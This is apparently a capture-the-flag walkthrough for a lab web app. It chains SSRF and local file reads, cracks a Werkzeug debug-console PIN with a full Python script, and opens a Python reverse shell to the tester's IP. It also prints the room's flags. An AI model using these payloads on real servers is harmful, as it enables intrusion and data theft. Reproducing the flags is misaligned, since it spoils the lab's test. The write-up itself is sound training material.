## Plant Photographer

Room Description: Dig deeper and try to uncover the flag hidden behind the scenes.

> Your friend, a passionate botanist and aspiring photographer, recently launched a personal portfolio website to showcase his growing collection of rare plant photos:
http://10.130.156.105/

Proud of building the site himself from scratch, he’s asked you to take a quick look and let him know if anything could be improved. 
Look closely at how the site works under the hood, and determine whether it was coded with best practices in mind. If you find anything questionable, dig deeper and try to uncover the flag hidden behind the scenes.

![image](Images/plant.png)

---

## Objectives:
1. What API key is used to retrieve files from the secure storage service?
2. What is the flag in the admin section of the website?
3. What flag is stored in a text file in the server's web directory? 

---

## Adding target to /etc/hosts

```shell
sudo echo -e "10.130.141.94 plant.thm" | sudo tee -a /etc/hosts
```

---

## Enumeration & Recon

> Rustscan results:

```shell
rustscan -a plant.thm --range 1-65535 --ulimit 5000 -- -sCV -O
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports faster than you can say 'SYN ACK'

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.130.156.105:22
Open 10.130.156.105:80
[~] Starting Script(s)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7b:ed:d1:db:a4:60:67:60:de:ed:b6:d9:b1:da:c3:e0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDmc47847561tPl38KjCkGzSUd8SZm7FPnJpyjNWTd9/mvNvU5XBd97DY4iza6LjR52wN61/Yr0twdvNxKqZnGW+KLNZiZUCf/6mqUo4IfD+b409lkPpYQNxHPckKtCtykFkue+NhqqdPRL+oXMoxNDqE2ahnmBOo/THW4Kiei2TYFfjJtmdzH9ygmgMB7ow2X8wFj25Wvlh7LdK8H7WVY1reM3DvogWV9sEZka0xu6OSQg/UX+q/V9VtDdWfkZKHQklrsnyKD61EwwGn2xFsLxg3HR+zw3+KsRjDKqN7CkNN1odZ87+ZERRthA5WCccR3Dn+pODJtVEqXDQ670OrSBVhEgTf54S5boZfXvbT4F60K5WwZm+qlH32ZLpTmwIjO9jFTmVr32f5M6BQurNxevwd3EQstqTP5L86aep1AGNgYBuDTYHSoWc6BEV69NW6d+MlHzvG1SDmlfW1sMfQzOJdAkot+KeQIMFI0cVpr1xSdT3mStpdSIcJeO0YcLjU=
|   256 70:28:82:05:8c:59:b9:62:f7:5d:63:b7:08:ad:f0:98 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBLRY3AUzlCs7Zvhz7LnCI+uheGlOUG7+XqVW1N2xSPB6/6HJeizb84UkBIT9MBJpNbp2jgRap6FUYUQJJ2olzI=
|   256 37:3e:b2:d8:2f:14:22:23:28:48:6c:5d:5b:c2:7d:d1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHwaHEWDxTdiqQ4J5deCtGBqI+dx7ADtB5di3lk7I/iv
80/tcp open  http    syn-ack ttl 61 Werkzeug httpd 0.16.0 (Python 3.10.7)
|_http-title: Jay Green
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/0.16.0 Python/3.10.7
```

![image](Images/Screenshot%20From%202026-07-11%2019-41-14.png)

---

> Feroxbuster results:

```shell
feroxbuster -u http://plant.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
                                                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.130.156.105/
 🚩  In-Scope Url          │ 10.130.156.105
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        4l       34w      232c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        6w       48c http://10.130.156.105/admin
200      GET        1l        3w       20c http://10.130.156.105/download
200      GET      380l     2666w   158526c http://10.130.156.105/static/imgs/profile.jpeg
200      GET     1397l     8026w   634581c http://10.130.156.105/static/imgs/plant2.png
200      GET     1364l     7401w   590699c http://10.130.156.105/static/imgs/plant4.png
200      GET     1520l     7939w   615832c http://10.130.156.105/static/imgs/plant3.png
200      GET     1532l     8161w   644730c http://10.130.156.105/static/imgs/plant1.png
200      GET      168l      547w     6899c http://10.130.156.105/
200      GET       52l      186w     1985c http://10.130.156.105/console
```

> admin page is only accessible internally, console page requires a PIN which can be cracked if we have enough system information, /download endpoint is potentially vulnerable to SSRF.

---

> Honestly, I was stuck for a while. I tried removing the mode:block; from UI, but it did not work. I had the leaked secret key from /console endpoint, hardcoded, and CONSOLE_MODE=true that meant we can execute python codes for RCE, but did not have any idea how to do. Then I did some research and learnt that:

```text
<script type="text/javascript">
      var TRACEBACK = -1,
          CONSOLE_MODE = true,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "DR8cMbreLMIaAsri4ljy";
    </script>
```

![image](Images/Screenshot%20From%202026-07-11%2019-43-52.png)


---

When we made a request to /download endpoint, we sent this GET request: 'GET /download?server=secure-file-storage.com:8087&id=75482342 HTTP/1.1' which downloads the resume of the owner of this page: Jay Green. The server was making requests to only internally accessible service, which requires `id` parameter, which gives `no file selected...` error. I tried changing `secure-file-storage.com` to `localhost/admin` but that alone gave the same error. After some digging, I found out that adding `?` query parameter before `&`, separates the id parameter from being parsed with server. Final request looked like:

```
curl "http://plant.thm/download?server=http://127.0.0.1/admin?&id=0"
```

> And instead of getting the file error, I got the source code of how pycurl works. Also completing the first objective, finding the API key under:

```
<pre class="line before"><span class="ws">
</span>crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{'redacted'}'])
</pre>
```

![image](Images/Screenshot%20From%202026-07-11%2019-53-09.png)

> In order to confirmg SSRF, we can just open a listener on port 8087, and replace the secure-file-storage with our own IP. And it seems it indeed is vulnerable to SSRF:

```shell
┌──(root㉿kali)-[~]
└─# nc -lvnp 8087                                    
listening on [any] 8087 ...
connect to [192.168.152.35] from (UNKNOWN) [10.130.141.94] 38112
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 192.168.152.35:8087
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{redacted}
```
---

## Local File Inclusion (LFI)

> After researching, I remembered that we can actually append `http://`, `file://`, and `gopher://` when exploiting SSRF vulnerability, depending on our purpose. So for confirming LFI vulnerability, I added `file:///etc/passwd` instead of `localhost/admin`, but I just got an error, because it was being appended before `/public-docs-k057230990384293/{id}`. Then I remembered the `?` query parameter to ignore the rest of the URL I used before, and adjusted accordingly:


```shell
curl "http://plant.thm/download?server=file:///etc/passwd?&id=75482342"         

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```


> And that was it, we chained the SSRF and LFI, and exfiltrated the /etc/passwd. Let's gather more system information, starting with MAC address:

```
┌──(root㉿kali)-[~]
└─# curl "http://plant.thm/download?server=file:///sys/class/net/eth0/address?&id=75482342"
02:42:ac:14:00:02
```

> Since we observed that `root` user is using /bin/ash instead of /bin/bash or /bin/sh, some file paths did not exist. I used used AI to find an alternative path to extract machine id:

```bash
┌──(root㉿kali)-[~]
└─# curl "http://plant.thm/download?server=file:///proc/sys/kernel/random/boot_id?&id=75482342"
d3280218-9392-4bcb-a50d-5e89c6d80c28
```

> IP Address:

```bash
┌──(root㉿kali)-[~]
└─#     curl "http://plant.thm/download?server=file:///proc/net/arp??&id=75482342" 
IP address       HW type     Flags       HW address            Mask     Device
172.20.0.1       0x1         0x2         02:42:73:77:72:e5     *        eth0
```

> Extracting Docker groups:

```bash
┌──(root㉿kali)-[~]
└─# curl "http://plant.thm/download?server=file:///proc/self/cgroup?&id=75482342"
12:rdma:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
11:devices:/docker/77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca
...
```

> app.py path: /usr/src/app/app.py

```shell
┌──(root㉿kali)-[~]
└─# curl "http://plant.thm/download?server=file:///proc/self/cmdline?&id=1" | tr '\0' ' ' 

  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     42 100     42   0      0     36      0   00:01   00:01              0
/usr/local/bin/python /usr/src/app/app.py
```

> app.py source code:

```bash
──(root㉿kali)-[~]
└─# curl "http://plant.thm/download?server=file:///usr/src/app/app.py?&id=1"

import os
import pycurl
from io import BytesIO
from flask import Flask, send_from_directory, render_template, request, redirect, url_for, Response

app = Flask(__name__, static_url_path='/static')

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/admin")
def admin():
    if request.remote_addr == '127.0.0.1':
        return send_from_directory('private-docs', 'flag.pdf')
    return "Admin interface only available from localhost!!!"

@app.route("/download")
def download():
    file_id = request.args.get('id','')
    server = request.args.get('server','')

    if file_id!='':
        filename = str(int(file_id)) + '.pdf'

        response_buf = BytesIO()
        crl = pycurl.Curl()
        crl.setopt(crl.URL, server + '/public-docs-k057230990384293/' + filename)
        crl.setopt(crl.WRITEDATA, response_buf)
        crl.setopt(crl.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])
        crl.perform()
        crl.close()
        file_data = response_buf.getvalue()

        resp = Response(file_data)
        resp.headers['Content-Type'] = 'application/pdf'
        resp.headers['Content-Disposition'] = 'attachment'
        return resp
    else:
        return 'No file selected... '

@app.route('/public-docs-k057230990384293/<path:path>')
def public_docs(path):
    return send_from_directory('public-docs', path)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8087, debug=True)
```

> When we look at `/admin` endpoint, it looks like it serves `flag.pdf`, but it's only accessible from localhost. I downloaded the flag using SSRF to make an HTTP request to the /admin endpoint, and read the flag from the PDF file.

```shell
┌──(root㉿kali)-[~]
└─# curl "http://plant.thm/download?server=http://127.0.0.1:8087/admin?&id=1" -o flag.pdf
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100  40958 100  40958   0      0  30922      0   00:01   00:01              0
                                                                                                                                                                                                                    
┌──(root㉿kali)-[~]
└─# file flag.pdf 
flag.pdf: PDF document, version 1.6, 1 page(s)

```

---

## Things we needed to crack the PIN:
```
Here is that exact data mapping laid out in a clean, organized table for your reference:

| Input Value | Source File / Logic | Command Used to Extract / Python Logic |
| --- | --- | --- |
| **username** | `/proc/self/status` <br>

<br> (or `/etc/passwd`) | Look for `Uid: 0 0 0 0` $\rightarrow$ maps to `root`. `getpass.getuser()` handles this internally. |
| **modname** | Standard Flask attribute | Derived directly from the framework source: `flask.app`. |
| **appname** | Standard Flask attribute | The name of the class instantiation: `Flask`. |
| **modfile** | `/proc/self/maps` | Look for the absolute path mapped to the process: `/usr/local/lib/python3.10/site-packages/flask/app.py`. |
| **MAC (as int)** | `/sys/class/net/eth0/address` | Extracted `02:42:ac:14:00:02`, stripped the colons, and converted from Hex to Base-10 Integer string. |
| **Machine ID** | `/proc/self/cgroup` | Read the cgroup lines and extracted the string following the `/docker/` path identifier. |
```     

## Calculating PIN for /console endpoint via leaked source code (werkzeug/debug/__init__.py):

```python3
import hashlib
from itertools import chain

# ============================================================
# probably_public_bits — Information that could be guessed
# from the HTML error pages (module names, app names, etc.)
# ============================================================
probably_public_bits = [
    'root',                                                                # username (from /etc/passwd + /proc/self/environ)
    'flask.app',                                                           # modname (Flask app's __module__)
    'Flask',                                                               # app.__name__ / app.__class__.__name__
    '/usr/local/lib/python3.10/site-packages/flask/app.py'                 # mod.__file__ (from /proc/self/maps)
]

# ============================================================
# private_bits — Harder to guess, requires LFI to obtain
# ============================================================
private_bits = [
    str(int("0242ac140002", 16)),                                          # MAC address as integer (from /sys/class/net/eth0/address)
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'     # Docker container ID (from /proc/self/cgroup)
]

# ============================================================
# PIN Calculation — Exact replica of Werkzeug's algorithm
# Uses MD5 (hashlib.md5) as per werkzeug/debug/__init__.py
# ============================================================
h = hashlib.md5()

# Feed all bits into the hash (both public and private)
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)

# Step 1: Update with cookiesalt (for cookie name derivation)
h.update(b'cookiesalt')

# Step 2: Update with pinsalt (for PIN derivation)
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

# Step 3: Format PIN with dashes (groups of 5, 4, or 3)
for group_size in (5, 4, 3):
    if len(num) % group_size == 0:
        pin = '-'.join(
            num[i:i+group_size].rjust(group_size, '0')
            for i in range(0, len(num), group_size)
        )
        break

print(pin)

```

cracked PIN: `110-688-511`

> /console endpoint:

![image](Images/Screenshot%20From%202026-07-11%2021-26-23.png)

> I tried some basic python codes for enumeration:

![image](Images/Screenshot%20From%202026-07-11%2021-28-59.png)

---

## Werkzeug Console RCE:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.152.35",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")
```

> Then I got the callback:

```sh
┌──(root㉿kali)-[~]
└─# rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.152.35] from (UNKNOWN) [10.130.159.207] 43936
/usr/src/app # lls
ls
Dockerfile                   public-docs
app.py                       requirements.txt
flag-982374827648721338.txt  static
private-docs                 templates
/usr/src/app # ccat flag-
/usr/src/app # cat flag-982374827648721338.txt 
THM{SSRF2RCE_2_1337_4_M3}
/usr/src/app # iid
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/usr/src/app # 

```

> Finally finishing the `Hard` rated CTF.
